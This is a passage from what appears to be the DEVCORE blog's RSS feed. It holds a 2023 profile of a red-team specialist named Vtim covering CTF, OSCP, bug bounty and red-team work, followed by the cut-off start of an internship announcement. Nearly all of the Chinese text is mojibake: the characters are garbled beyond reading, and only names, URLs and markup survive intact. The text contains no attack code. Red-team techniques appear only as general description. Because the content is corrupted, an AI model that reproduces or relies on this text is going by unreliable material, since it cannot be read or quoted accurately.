&lt;em&gt;Â§ßÂ≠∏ÂâçÂÖ©Âπ¥ÔºåVtim ÁöÑË™≤ÂæåÊ¥ªË∫çÂ∫¶ÈÅ†È´òÊñºË™≤Â†ÇÊ¥ªË∫çÂ∫¶„ÄÇ&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;„ÄåÂ•ΩÂÉèÂæàÂ§ö‰∫∫Ë¶∫ÂæóÈß≠ÂÆ¢Â∞±ÊòØÊï≤Êï≤ÈçµÁõ§Â∞±ËÉΩÂÖ•‰æµ‰∫ÜÔºü‰ΩÜÂÖ∂ÂØ¶Áï∂Èß≠ÂÆ¢Ë¶ÅÂ≠∏ÁöÑÊù±Ë•øÂØ¶Âú®Â§™Â§ö‰∫ÜÔºÅ„ÄçVtim ÈÇäË™™ÈÇäÂ±ïÁ§∫‰∫Ü‰∏ÄÂºµÂØÜÂØÜÈ∫ªÈ∫ªÁöÑË≥áÂÆâË≠âÁÖßÂúñÔºåÊúÄ‰∏äÈù¢ÁöÑÂ∞èÂ≠óÂâáÂØ´Ëëó„Äå356 Á®ÆË≠âÁÖß„Äç„ÄÇÂ§ßÂ≠∏ÊôÇÊúüÂ∞±ËÆÄÊñºÂúãÁ´ãÊàêÂäüÂ§ßÂ≠∏Ë≥áË®äÂ∑•Á®ãÂ≠∏Á≥ªÁöÑ VtimÔºåÂù¶Ë®ÄËá™Â∑±Â§ßÂ≠∏ÂâçÂÖ©Âπ¥Âü∫Êú¨‰∏äÈÉΩÂú®ÁøπË™≤ËÄçÂª¢„ÄÅÂøôËëóË∑ëÊ¥ªÂãïË∑üÊâìÈõªÂãïÔºåÁõ¥Âà∞Â§ß‰∏âÊâçÈñãÂßãÂ•ΩÂ•ΩÂä™Âäõ„ÄÅÂ§©Â§©Âêë‰∏äÔºåÈñíËëóÊ≤í‰∫ãÂ∞±Âà∑ÊºîÁÆóÊ≥ïÈ°åÔºåÂ§ßÂõõÊöëÂÅáÊüêÂ§©ÔºåÂÆ§ÂèãÈö®Âè£Âïè‰ªñË¶Å‰∏çË¶Å‰∏ÄËµ∑ÂèÉÂä†„ÄåAIS3 Êñ∞ÂûãÊÖãË≥áÂÆâÊöëÊúüË™≤Á®ã„ÄçÔºåÊ≤íÊúâÂ§öÊÉ≥ÁöÑ‰ªñÈö®Âè£Á≠îÊáâÂæåÔºåÊâçÂæóÁü•Â†±ÂêçÂâçË¶ÅÂÖàËÄÉ„ÄåCTF (Capture the Flag) pre-exam„Äç„ÄÇÂú®Ê≠§‰πãÂâçÈÄ£„ÄåXSS„Äç„ÄÅ„ÄåSQL Injection„ÄçÈÉΩ‰∏ÄÂïè‰∏â‰∏çÁü•ÁöÑ‰ªñÔºåÁ´üÊÑèÂ§ñÂú∞Êãø‰∏ã‰∫ÜÁ¨¨ÂõõÂêçÔºåËá™Ê≠§ÈñãÂïü‰∫Ü‰ªñÂ∞çË≥áÂÆâÁöÑËààË∂£„ÄÇ&lt;/p&gt;

&lt;p&gt;Â§ßÂõõ‰∏ãÂ≠∏ÊúüÔºåVtim ÂçØËµ∑‰æÜÊâæÁ∑ö‰∏äË≥áÂÆâË™≤Á®ãËá™Â≠∏ÔºåÂ≠∏ÁøíÂêÑÁ®ÆÂÖ•‰æµÁ≥ªÁµ±ÁöÑÂéüÁêÜ‰ª•ÂèäÊîªÊìäÊâãÊ≥ïÔºåËàáÊ≠§ÂêåÊôÇÔºåÂÆ§ÂèãÂâáÊ≤âËø∑Êñº LOL Ëã±ÈõÑËÅØÁõüÔºåÁÇ∫‰∫ÜÊ∂àÈô§ÊÉ±‰∫∫ÁöÑËÉåÊôØÂô™Èü≥ÔºåVtim Ë©¶Ëëó‰ª•Èß≠ÂÆ¢ÁöÑÊñπÂºèÊñ∑‰∫ÜÂÆ§ÂèãÁ∂≤Ë∑Ø„ÄÇ„ÄåÁµêÊûú‰ªñÂÄëÂ∞±Êõ¥Âêµ‰∫Ü‚Ä¶‚Ä¶‰∏ÄÁõ¥Âú®ÂìÄÂöéÔºÅ„Äç‰ªñÁ¨ëÈÅì„ÄÇÈô§Ê≠§‰πãÂ§ñÔºå‰ªñ‰πüÈñãÂßãË©¶ËëóËá™Â∑±ÊâìÂêÑÁ®Æ CTF Á∑ö‰∏äÊØîË≥Ω„ÄÇÁâπÂà•ÁöÑÊòØÔºå‰ªñÊ≤íÊúâÂÉèÂÖ∂‰ªñ‰∫∫‰∏ÄÊ®£ÁµÑÈöäÂèÉË≥ΩÁ¥ØÁ©çÊõ¥Â§öÂàÜÊï∏ÔºåËÄåÊòØ‰∏ÄÂÄã‰∫∫Êë∏Á¥¢„ÄÅÂ≠∏ÁøíÂà•‰∫∫ÁöÑËß£È°åÊÄùË∑Ø„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230526/2.png&quot; alt=&quot;&quot; /&gt;
&lt;em&gt;Vtim Â§ßÂõõ‰∏ãÂ≠∏ÊúÉÊñ∑ÂÆ§ÂèãÁ∂≤Ë∑ØÊôÇ‰ΩøÁî®ÁöÑÁÑ°Á∑öÁ∂≤Âç°„ÄÇ&lt;/em&gt;&lt;/p&gt;

&lt;h3 id=&quot;ÊºèÊ¥ûÁçéÂãµÊºèÊ¥ûÊØîË≥ΩÂØ¶Êà∞Ë≠âÁÖß‰∏ÄÊääÁΩ©&quot;&gt;ÊºèÊ¥ûÁçéÂãµ„ÄÅÊºèÊ¥ûÊØîË≥Ω„ÄÅÂØ¶Êà∞Ë≠âÁÖß‰∏ÄÊääÁΩ©&lt;/h3&gt;

&lt;p&gt;Â§ßÂ≠∏Áï¢Ê•≠ÂæåÔºåVtim ÈÄ≤ÂÖ•ÂúãÔß∑Ëá∫ÁÅ£ÁßëÊäÄÂ§ßÂ≠∏Ë≥áË®äÁÆ°ÁêÜÁ≥ªÁ†îÁ©∂ÊâÄË≥áË®äÂÆâÂÖ®ÂØ¶È©óÂÆ§ÔºåÁî±Âê≥ÂÆóÊàêÊïôÊéàÊåáÂ∞é„ÄÇÁ¢©Â£´ÊôÇÊúüÔºåVtim È†ÜÂà©ÈÄöÈÅéÂæµÈÅ∏ÔºåÈÄ£Á∫åÊàêÁÇ∫ÊïôËÇ≤ÈÉ®„ÄåË≥áÂÆâ‰∫∫ÊâçÂüπËÇ≤Ë®àÁï´ÔºçË≥áÂÆâÂØ¶ÂãôÂ∞éÂ∏´Âà∂Â∫¶ÔºçËá∫ÁÅ£Â•ΩÂé≤Èß≠„ÄçÂÖ©Â±ÜÂüπË®ìÂ≠∏Âì°ÔºåÂ∞éÂ∏´ÂâáÂàÜÂà•ÊòØ DEVCORE ÁöÑÂü∑Ë°åÈï∑Êö®ÂÖ±ÂêåÂâµËæ¶‰∫∫ Allen ÂèäÈ¶ñÂ∏≠Ë≥áÂÆâÁ†îÁ©∂Âì° OrangeÔºàÂêåÊôÇ‰πüÊòØ Vtim ÂèäË®±Â§ö‰∫∫Áúº‰∏≠ÁöÑ„ÄåÂÇ≥Â•áÊª≤ÈÄèÂ∏´„ÄçÔºâÔºå‰πüÂú®Ê≠§ÊôÇË™çË≠ò‰∫ÜË®±Â§öÈß≠ÂÆ¢Â§ßÁ•û„ÄÇÈô§Ê≠§‰πãÂ§ñÔºå‰ªñ‰πüÈñãÂßãÂòóË©¶Á†¥Ëß£Èù∂Ê©üÈ°ûÂûãÁöÑÈ°åÁõÆÔºåÊãìÂ±ïÂéüÊú¨ÂÉÖÈôêÊñº CTF ÁöÑËß£È°åÈ°åÂûã„ÄÇ&lt;/p&gt;

&lt;p&gt;Âêå‰∏ÄÊôÇÈñìÔºåVtim ‰πüÈÄ≤ÂÖ•‰∫ÜË≥áÂÆâÂÖ¨Âè∏ÂØ¶ÁøíÔºå‰∏ªË¶ÅË≤†Ë≤¨Êª≤ÈÄèÊ∏¨Ë©¶ÁöÑÂü∑Ë°å„ÄÇ‰πüÊòØÂú®ÂØ¶ÁøíÂæåÔºå‰ªñÊâçÊòéÈ°ØÊÑüÂèóÂà∞‰ºÅÊ•≠ÁúüÂØ¶Áí∞Â¢ÉËàáÁ∑ö‰∏äÊØîË≥ΩÁöÑÂ∑ÆÁï∞Ôºå‰æãÂ¶Ç‰ºÅÊ•≠‰∏çÂÉèÈù∂Ê©ü‰∏ÄÂÆöÊúâÊ¥û„ÄÅÊåáÂÆöÊª≤ÈÄèÁöÑÁ≥ªÁµ±‰∏çË¶ãÂæóÁÜüÊÇâ„ÄÇÈô§Ê≠§‰πãÂ§ñÔºåÂ¶Ç‰ΩïÂ∞áÊ∏¨Ë©¶ÊôÇÁöÑÁôºÁèæËΩâÊèõÁÇ∫‰ºÅÊ•≠ÂèØÁêÜËß£ÁöÑÂ†±ÂëäÔºå‰πüÊòØÂπ≥ÊôÇËá™Â≠∏ÊôÇÂ∞ëÊúâÊ©üÊúÉÂ≠∏ÁøíÁöÑÊäÄËÉΩ„ÄÇ&lt;/p&gt;

&lt;p&gt;ÁÇ∫‰∫ÜË≠âÊòéËá™Â∑±ÊâÄÂ≠∏ÁöÑÂÉπÂÄºÔºåVtim ÈñãÂßãÂèÉËàáÊºèÊ¥ûÁçéÂãµË®àÁï´Ôºå‰∏¶ÊàêÂäüÁôºÁèæ LINE ÁöÑÊºèÊ¥ûÔºåÂèñÂæó‰∫∫Áîü‰∏≠È¶ñÊ¨°ÊºèÊ¥ûÁçéÂãµÁöÑÊàêÂ∞±ÔºåÁç≤Âæó‰∫Ü 1,000 ÁæéÈáëÁöÑÁçéÂãµ„ÄÇËàáÊúãÂèãÁµÑÈöäÂèÉÂä†ÊºèÊ¥ûÊåñÊéòÁ´∂Ë≥ΩÔºå‰πüÈ†ÜÂà©Â•™ÂÜ†„ÄÇÈ¶ñÊ¨°ÂòóË©¶ÊåëÊà∞ OSCP ÔºàOffensive Security Certified ProfessionalÔºâÂØ¶Êà∞ÂûãË≠âÁÖßÔºåÂç≥È†ÜÂà©ÈÄöÈÅé„ÄÇVtim Ë£úÂÖÖÔºåËÄÉÁîüÈ†àÂú® 24 Â∞èÊôÇÊâì‰∏ã 5 Âè∞Ê©üÂô®ÔºåÂÜçËä± 24 Â∞èÊôÇÂØ´‰∏Ä‰ªΩÊª≤ÈÄèÊ∏¨Ë©¶Â†±ÂëäÔºåÊòØÈùûÂ∏∏ËÄÉÈ©óÈ´îÂäõË∑üËÉΩÂäõÁöÑ‰∏ÄÂºµË≠âÁÖß„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230526/3.png&quot; alt=&quot;&quot; /&gt;
&lt;em&gt;Vtim È¶ñÊ¨°ÂòóË©¶ÊåëÊà∞ OSCP ÂØ¶Êà∞ÂûãË≠âÁÖßÔºåÂç≥È†ÜÂà©ÈÄöÈÅé„ÄÇ&lt;/em&gt;&lt;/p&gt;

&lt;h3 id=&quot;Âêå‰∫ãÂº∑Âà∞‰∏çÁ¶ÅÊá∑Áñë‰∫∫Áîü--Á¨¨‰∏ÄÁ∑öÂ≠∏È´òÊâãÊÄùË∑Ø‰∏çÊñ∑ÊàêÈï∑&quot;&gt;Âêå‰∫ãÂº∑Âà∞‰∏çÁ¶ÅÊá∑Áñë‰∫∫Áîü  Á¨¨‰∏ÄÁ∑öÂ≠∏È´òÊâãÊÄùË∑Ø‰∏çÊñ∑ÊàêÈï∑&lt;/h3&gt;

&lt;p&gt;Âõ†ÁÇ∫„ÄåÊâÄÊúâÊäÄËÉΩÈªûÈÉΩÈªûÂú®ÊîªÊìä„ÄçÔºåVtim Âú®Á†îÁ©∂ÊâÄÁï¢Ê•≠ÂæåÔºåÂ∞ãÊâæÁöÑ‰πüÊòØÊîªÊìäÊ∏¨Ë©¶Áõ∏ÈóúÂ∑•‰Ωú„ÄÇË©ï‰º∞ÈÅéÂæåÔºåÂ±•Ê≠∑Âè™Êäï‰∫Ü DEVCORE„ÄÇ„ÄåÁï∂ÊôÇÊâì CTF ÊôÇÂæàÂ¥áÊãú Orange Ë∑ü AngelboyÔºåÁôºÁèæ‰ªñÂÄëÈÉΩÂú® DEVCOREÔºåÂ∞±Ë¶∫ÂæóÈÄôÈñìÂÖ¨Âè∏ÊáâË©≤ÊòØÂè∞ÁÅ£Èß≠ÂÆ¢ÊäÄË°ìÊúÄÈ†ÇÂ∞ñÁöÑÔºå‰πüÂ∏åÊúõËÉΩÂä†ÂÖ•Â¢ûÂº∑Ëá™Â∑±ÁöÑÂØ¶ÂäõÔºÅ„Äç‰ªñÂõûÊÜ∂„ÄÇ&lt;/p&gt;

&lt;p&gt;ÈÅé‰∫îÈóúÊñ¨ÂÖ≠Â∞áÂæåÔºåVtim ‰ª•Á¥ÖÈöäÊºîÁ∑¥Â∞àÂÆ∂ÁöÑË∫´‰ªΩÂä†ÂÖ• DEVCORE„ÄÇ„Äå‰∏ÄÈñãÂßãÂÖ∂ÂØ¶Ë†ªÊå´ÊäòÁöÑÔºåÂõ†ÁÇ∫Ëá™Â∑±Â§™Áº∫‰πèÂæåÊª≤ÈÄèÈúÄË¶ÅÁöÑÁü•Ë≠òÔºåÁ∂ìÈ©ó‰πü‰∏çË∂≥„ÄÇ„ÄçVtim Ë™™ÔºåËá™Â∑±ÂéüÊú¨ÊâÄÂ≠∏ÂÉÖÊòØÂñÆÁ¥îÊâì‰∏ã‰∏ªÊ©üÔºå‰ΩÜÂØ¶ÈöõÊâì‰∏ã‰∏ªÊ©üÂæåÊÄéÈ∫ºÁπûÈÅéÈò≤ÊØíËªüÈ´î„ÄÅEDR„ÄÅÊ©´ÂêëÁßªÂãï„ÄÅÂÖßÁ∂≤Êª≤ÈÄèÔºåÈÉΩÊòØÊú¨‰æÜÂú®ÊâìÈù∂Ê©üÈ°åÁõÆËºÉÂ∞ëÂ≠∏Âà∞ÁöÑÊâãÊ≥ï„ÄÇÊ≠§Â§ñÔºåÊäÄË°ìÂº∑Â§ßÁöÑÂêå‰∫ãÁæ§Ôºå‰πüËÆì‰ªñ‰∏çÁ¶ÅÊá∑ÁñëËµ∑Ëá™Â∑±ÁöÑËÉΩÂäõ„ÄÇ&lt;/p&gt;

&lt;p&gt;‰ΩÜ Vtim ‰∏¶Êú™Âõ†Êå´ÊäòÊÑüËÄåÊîæÊ£ÑÔºåÁõ∏ÂèçÂú∞ÔºåÊÜëËëóÂ∞çÊäÄË°ìÁöÑÁÜ±ÊÉÖÔºå‰∏çÊñ∑Â≠∏ÁøíÈ´òÊâãÂÄëÁöÑÊÄùË∑ØÔºå‰ªñ‰πü‰∏çÊñ∑ÊàêÈï∑ÔºåËÆìËá™Â∑±Ë∂ä‰æÜË∂äÂº∑Â§ß„ÄÇ„ÄåÈÅáÂà∞Âõ∞Èõ£ÊôÇÔºåÊàëÊúÉÊÉ≥ÂÉèÈÄô‰∫õ‰∫∫ÊúÉÊÄéÈ∫ºÂÅöÔºåËóâÊ≠§Ë™øÊï¥Ëá™Â∑±ÁöÑÂøÉÊÖãÂíåÊÄùË∑ØÔºåÂú®Èù¢Â∞çÂïèÈ°åÊôÇ‰∏çËá≥ÊñºÊ≤íÊúâÊñπÂêëÊàñÈ©öÊÖåÂ§±Êé™„ÄÇ„Äç‰ªñÁî±Ë°∑Âú∞Ë™™„ÄÇDEVCORE ÁöÑÂâçËº©ÂÄë‰πüÁõ∏Áï∂Ê®ÇÊñºÂàÜ‰∫´ÔºåËÆì‰ªñÈÄêÊº∏ÊâæÂá∫Ëß£Ê±∫ÂïèÈ°åÁöÑÊñπÊ≥ïÔºå‰πüÂú®ÁúæÂ§öÈ´òÊâãÁöÑÂà∫ÊøÄ‰∏ãÔºå‰∏çÊñ∑Á≤æÈÄ≤Ëá™Â∑±„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230526/4.png&quot; alt=&quot;&quot; /&gt;
&lt;em&gt;VtimÔºàÂæåÊéíÂ∑¶‰∫åÔºâËàáÂêå‰∫ãÊñº DEVCORE ÂÖÖÈõªÈÄ±ÂØÜÂÆ§ÈÄÉËÑ´ÔºåË®ìÁ∑¥Ëß£È°åËÉΩÂäõ„ÄÇ&lt;/em&gt;&lt;/p&gt;

&lt;h3 id=&quot;Á¥ÖÈöäÊºîÁ∑¥ÊàêÊú¨È´ò--Èß≠ÂÆ¢Â∞àÊîªÁ∂≤Ë∑ØÈÇäÁïå&quot;&gt;Á¥ÖÈöäÊºîÁ∑¥ÊàêÊú¨È´ò  Èß≠ÂÆ¢Â∞àÊîªÁ∂≤Ë∑ØÈÇäÁïå&lt;/h3&gt;

&lt;p&gt;„ÄåÁ¥ÖÈöäÊºîÁ∑¥„ÄçÂ∞çÂæàÂ§ö‰∫∫ËÄåË®ÄÈÇÑÊòØÁõ∏Áï∂ÈôåÁîüÔºåVtim Ëß£ÈáãÔºåÁ¥ÖÈöäÊºîÁ∑¥ÂÖ∂ÂØ¶ÊòØÊºèÊ¥ûÊ™¢Ê∏¨ÊúçÂãôÁöÑ‰∏ÄÁ®ÆÔºåÊºèÊ¥ûÊ™¢Ê∏¨ÊúçÂãôÂèØÂàÜÁÇ∫Âº±ÈªûÊéÉÊèè„ÄÅÊª≤ÈÄèÊ∏¨Ë©¶„ÄÅÁ¥ÖÈöäÊºîÁ∑¥ÔºåÂÖ∂‰∏≠Á¥ÖÈöäÊºîÁ∑¥ÊòØÊ∏¨Ë©¶ÁØÑÂúçÊúÄÂÖ®Èù¢„ÄÅÊúÄË≤ºËøëÁèæÂØ¶Èß≠ÂÆ¢ÊîªÊìäÊâãÊ≥ïÔºå‰∏îËÉΩÁôºÁèæÁáüÈÅãÂ±§Èù¢Áº∫Â§±‰∏¶Ê™¢Ë¶ñÊï¥È´îË≥áÂÆâÈò≤Á¶¶Ê©üÂà∂ÔºåÂõ†Ê≠§Á¥ÖÈöäÊºîÁ∑¥ÊâÄÈúÄÁöÑ‰∫∫ÂäõÈñÄÊ™ªÊõ¥È´ò„ÄÅ‰ΩøÁî®Ë≥áÊ∫êÊõ¥Â§öÔºåÊàêÊú¨‰πüÊòØ‰∏âËÄÖÊúÄÈ´òÁöÑ„ÄÇ&lt;/p&gt;

&lt;p&gt;Ëã•Ë¶Å‰ª•‰∏ÄÂè•Ë©±Ëß£ÈáãÁ¥ÖÈöäÊºîÁ∑¥ÔºåÂç≥ÊòØ‰ºÅÊ•≠Âßî‰ªªÂ∞àÊ•≠Á¥ÖÈöäÂúòÈöäÔºåË®≠Ê≥ïÈÄèÈÅéÂêÑÁ®ÆÊñπÂºè„ÄÅÁîöËá≥ÁµÑÂêàÂºèÁöÑÊîªÊìäÊâãÊ≥ïÔºåÊ®°Êì¨ÂÖ•‰æµ‰ºÅÊ•≠ÔºåÂú®ÊôÇÈôêÂÖßÈÅîÊàê‰ºÅÊ•≠ÊåáÂÆö‰ªªÂãôÔºåÂ¶ÇÂèñÂæóÊüêÂè∞ÈõªËÖ¶ÁöÑÊéßÂà∂Ê¨äÊàñÊ†∏ÂøÉÂÖßÁ∂≤ÁöÑÊ©üÂØÜË≥áÊñôÁ≠â„ÄÇ‰ªñÂº∑Ë™øÔºåË®±Â§ö‰ºÅÊ•≠Â∞áË≥áÂÆâÈò≤Á¶¶ÈáçÈªûÊîæÂú®Ê†∏ÂøÉÁ∂≤Á´ôÂèäÁ≥ªÁµ±ÔºåÂ∞çÊñºÈß≠ÂÆ¢ËÄåË®ÄÔºåËã•ÊîªÊìäÈÄôÈ°ûÈò≤ÂÆàÂö¥ÂØÜÁöÑÂçÄÂ°äÊàêÊú¨ÈÅéÈ´òÔºåÂâáÊúÉÂ∞áÊîªÊìäÁõÆÊ®ôËΩâÁßªÂà∞‰ºÅÊ•≠ËºÉÁ∂≤Ë∑ØÈÇäÁïå‰∏≠Èò≤Ë≠∑ËºÉÂº±ÁöÑÁ≥ªÁµ±„ÄÇ&lt;/p&gt;

&lt;p&gt;Ëá≥ÊñºÂ¶Ç‰ΩïÂæûÊâæÂá∫Á∂≤Ë∑ØÈÇäÁïåÁöÑÁ≥ªÁµ±ÈÄ≤ËÄåÂÖ•‰æµÊàêÂäüÔºü‰ªñËàâ‰æãÔºåÁ¥ÖÈöäÂ∑•‰Ωú‰∏ªË¶ÅÂèØ‰ª•ÂàÜÊàêÂÖ©ÂÄãÈöéÊÆµÔºåÂàÜÂà•ÊòØÂèñÂæóÂ§ñÁ∂≤ÈÄ≤ÂÖ•Èªû‰ª•ÂèäÂÖßÁ∂≤Êª≤ÈÄèÔºå‰ª•Á¨¨‰∏ÄÈöéÊÆµÁöÑÂèñÂæóÂ§ñÁ∂≤ÈÄ≤ÂÖ•ÈªûËÄåË®ÄÔºåÊîªÊìäËÄÖÊúÉÂòóË©¶ÂêÑÁ®ÆÊîªÊìäÊâãÊ≥ïÂÖ•‰æµ‰ºÅÊ•≠ÂÖßÁ∂≤Ôºå‰æãÂ¶ÇÁ™ÅÁ†¥Èò≤ÂÆàËºÉËñÑÂº±ÁöÑÁ∂≤Ë∑ØÈÇäÁïå‰∏ªÊ©üÔºåÊàñÂæû GitHub Á≠âÁ∑ö‰∏äËªüÈ´îÂéüÂßãÁ¢º‰ª£ÁÆ°ÊúçÂãôÂπ≥Âè∞Â∞ãÊâæ‰ºÅÊ•≠Ê¥©ÊºèÁöÑÁ®ãÂºèÁ¢ºÊàñÊ©üÊïèË≥áË®ä‰ª•Âà©Áî®„ÄÇÊ≠§Â§ñÔºå‰∫¶ÂèØËÉΩÂòóË©¶ÈÄ≤Ë°åÁ§æ‰∫§Â∑•Á®ãÔºåÂØÑÈÄÅÊ§çÂÖ•ÂæåÈñÄÁ®ãÂºèÁöÑÈá£È≠ö‰ø°‰ª∂ÔºåÁîöËá≥ÂØ¶È´îÂâçÂæÄÁõÆÊ®ôÂÖ¨Âè∏ÈôÑËøëÈÄ≤Ë°å WiFi Â∞ÅÂåÖÁöÑÂÅ¥ÈåÑÂèäÁ†¥Ëß£ÔºåÂæÖÊàêÂäüÈÄ≤ÂÖ•‰ºÅÊ•≠ÂÖßÁ∂≤ÂæåÔºåÂç≥ÈñãÂßãÁ¨¨‰∫åÈöéÊÆµÁöÑÂÖßÁ∂≤Êª≤ÈÄèÔºå‰∏ÄÊ≠•Ê≠•ÂæûÁ∂≤Ë∑ØÈÇäÁïåÈÄ≤Ë°åÊ©´ÂêëÁßªÂãïÔºåÊúÄÁµÇÂÖ•‰æµÂà∞Ê†∏ÂøÉÁ∂≤ÊÆµÔºåÂèñÂæóÊ†∏ÂøÉÁ≥ªÁµ±ÊéßÂà∂Ê¨äÊàñÂèñÂæóÊ©üÂØÜË≥áÊñôÔºåÈÅîÊàê‰ªªÂãôÁõÆÊ®ô„ÄÇ&lt;/p&gt;

&lt;h3 id=&quot;ËàáÊñ∞Áü•ÂèäÊôÇÈôêË≥ΩË∑ë--ÁÜ±ÊÉÖÂèäËß£È°åËÉΩÂäõÂæàÈáçË¶Å&quot;&gt;ËàáÊñ∞Áü•ÂèäÊôÇÈôêË≥ΩË∑ë  ÁÜ±ÊÉÖÂèäËß£È°åËÉΩÂäõÂæàÈáçË¶Å&lt;/h3&gt;

&lt;p&gt;Â∞çÊñºÈÄôÂÄãËÅ∑‰ΩçÁöÑÊåëÊà∞ÔºåVtim Ë™çÁúüÊÄùËÄÉ‰∫Ü‰∏Ä‰∏ãÔºåË°®Á§∫Ë∫´ÁÇ∫Á¥ÖÈöäÈ†à‰∏çÊñ∑ËàáÊñ∞ÁöÑÊäÄË°ìË≥ΩË∑ëÔºåÊñ∞ÁöÑÁü•Ë≠òËàáÊû∂ÊßãÊó•Êñ∞ÊúàÁï∞ÔºåÂè™ËÉΩ‰∏çÊñ∑ÊåÅÁ∫åÂ≠∏ÁøíËàáÁ™ÅÁ†¥„ÄÇÊ≠§Â§ñÔºåÊØèÊ¨°Â∞àÊ°à‰πüÈÉΩÂú®ÂòóË©¶Á™ÅÁ†¥Ëá™Â∑±ÁöÑÊ•µÈôêÔºåÂ∏∏Â∏∏ÈÅáÂà∞ÊôÇÈôêËø´Âú®ÁúâÁù´‰ΩÜÂßãÁµÇÊâæ‰∏çÂà∞ÈÄ≤ÂÖ•ÈªûÔºåÊúÄÂæåÊâçÂèà„ÄåÁµïËôïÈÄ¢Áîü„ÄçÔºå‰πüÈúÄË¶ÅÊâøÂèó‰∏ÄÂÆöÁ®ãÂ∫¶ÁöÑÂøÉÁêÜÂ£ìÂäõ„ÄÇ&lt;/p&gt;

&lt;p&gt;‰ªñË™çÁÇ∫ÔºåÁ¥ÖÈöäÂ∞àÂÆ∂Èô§‰∫ÜÊáÇÊîªÊìäÔºåÈÇÑË¶ÅÊáÇÂæóÂ¶Ç‰ΩïÊèê‰æõÂÆ¢Êà∂Â∞àÊ•≠ÁöÑË≥áÂÆâÈò≤Á¶¶Âª∫Ë≠∞ÔºåÈúÄË¶ÅÊúâÁ∂úËßÄÂÖ®Â±ÄÁöÑËÉΩÂäõ„ÄÇ„ÄåÂ∞çÂÆ¢Êà∂ËÄåË®ÄÔºåÊîªÊìä‰∏çÂÆåÂÖ®ÊòØÈáçÈªûÔºå‰ªñÂÄëÊõ¥ÊÉ≥Áü•ÈÅìÊâæÂà∞ÂïèÈ°åÂæåÂ¶Ç‰ΩïÁ∑©Ëß£È¢®Èö™„ÄÇ„ÄçVtim Ë°®Á§∫„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230526/5.png&quot; alt=&quot;&quot; /&gt;
&lt;em&gt;‰∏ãÁè≠ÂæåÁöÑ Vtim ÈÇÑËàáÂêå‰∫ãÁµÑÊàêÊ®ÇÂúòÔºåÊìî‰ªª Bass ÊâãÁöÑËßíËâ≤„ÄÇ&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Â∞çÊñºÊú™‰æÜÔºåVtim ÊúüÂæÖËá™Â∑±ÊàêÁÇ∫ÂÖ®ËÉΩÂûãÁöÑÁôΩÂ∏ΩÈß≠ÂÆ¢„ÄÇ„ÄåÈÄ≤ÊîªÈÅéÁ®ãÊúÉÈÅáÂà∞ÂæàÂ§ö‰∏çÂêåÁöÑÁí∞Â¢ÉÔºå‰∏çÂêåÊîªÊìäÈöéÊÆµ‰πüÈúÄË¶Å‰∏çÂêåÈ†òÂüüÁöÑÊäÄÂ∑ßÔºåÊàëÂ∏åÊúõËá™Â∑±ËÉΩÊéåÊè°ÂÖ®ÈÉ®Èù¢ÂêëÔºåÁç®ÂäõÊéíËß£ÊâÄÊúâÈõ£È°åÔºåÈÅîÂà∞„ÄéÊåáÂì™ÊâìÂì™„ÄÅÊîªÊìäËá™Â¶Ç„ÄèÁöÑÂ¢ÉÁïå„ÄÇ„Äç‰ªñÊªøÊá∑ÊúüÂæÖÂú∞Ë™™„ÄÇ&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2023/05/26/from-cybersecurity-muggle-to-red-team-specialist-vtim/</link>
                <guid>https://devco.re/blog/2023/05/26/from-cybersecurity-muggle-to-red-team-specialist-vtim</guid>
                <pubDate>Fri, 26 May 2023 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>DEVCORE 2023 Á¨¨‰∏âÂ±ÜÂØ¶ÁøíÁîüË®àÁï´</title>
                <description>&lt;p&gt;DEVCORE ÂâµÁ´ãËøÑ‰ªäÂ∑≤ÈÄæÂçÅÂπ¥ÔºåÊåÅÁ∫åÂ∞àÊ≥®ÊñºÊèê‰æõ‰∏ªÂãïÂºèË≥áÂÆâÊúçÂãôÔºå‰∏¶Ëá¥ÂäõÂ∞ãÊâæÂêÑÁ®ÆÂÆâÂÖ®È¢®Èö™ÂèäÊºèÊ¥ûÔºåËÆì‰∏ñÁïåËÆäÂæóÊõ¥ÂÆâÂÖ®„ÄÇÁÇ∫‰∫ÜÊåÅÁ∫åÂ∞ãÊâæÊõ¥Â§öÊìÅÊúâÁõ∏ÂêåÁêÜÂøµÁöÑË≥áÂÆâÊñ∞Èä≥„ÄÅÂçîÂä©Â≠∏ÁîüÂª∫ÊßãÊ≠£Á¢∫Ë≥áÂÆâÊÑèË≠òÂèäÊäÄËÉΩÔºåÊàëÂÄëÊàêÁ´ã‰∫Ü„ÄåÊà¥Â§´ÂØáÁàæÂÖ®ÂúãË≥áË®äÂÆâÂÖ®ÁçéÂ≠∏Èáë„ÄçÔºå2022 Âπ¥Âàù‰πüÈñãÂßãËàâËæ¶È¶ñÂ±ÜÂØ¶ÁøíÁîüË®àÁï´ÔºåÁõÆÂâçÁÇ∫Ê≠¢ÊàêÊûúÈ†óË±ê„ÄÅË∂Ö‰πéÈ†êÊúüÔºåÁ¨¨‰∫åÂ±ÜÂØ¶ÁøíÁîüË®àÁï´‰πüÂ∞áÊñº‰ªäÂπ¥ 2 ÊúàÂ∫ïÂëä‰∏ÄÊÆµËêΩ„ÄÇÊàëÂÄëÂæàÊ¶ÆÂπ∏Âú∞ÂÆ£‰ΩàÔºåÁ¨¨‰∏âÂ±ÜÂØ¶ÁøíÁîüË®àÁï´Âç≥Â∞áÁôªÂ†¥ÔºåËã•ÊÇ®ÊúüÂæÖÂä†ÂÖ•ÊàëÂÄë„ÄÅÁ≤æÈÄ≤Ë≥áÂÆâÊäÄËÉΩÔºåÁÖ©Ë´ãË©≥Èñ±‰∏ãÂàóË≥áË®äÂæå‰æÜ‰ø°Â†±ÂêçÔºÅ&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;ÂØ¶ÁøíÂÖßÂÆπ&quot;&gt;ÂØ¶ÁøíÂÖßÂÆπ&lt;/h3&gt;

&lt;p&gt;Êú¨Ê¨°ÂØ¶ÁøíÂàÜÁÇ∫ Binary Âèä Web ÂÖ©ÂÄãÁµÑÂà•Ôºå‰∏ªË¶ÅÂÖßÂÆπÂ¶Ç‰∏ãÔºö&lt;/p&gt;

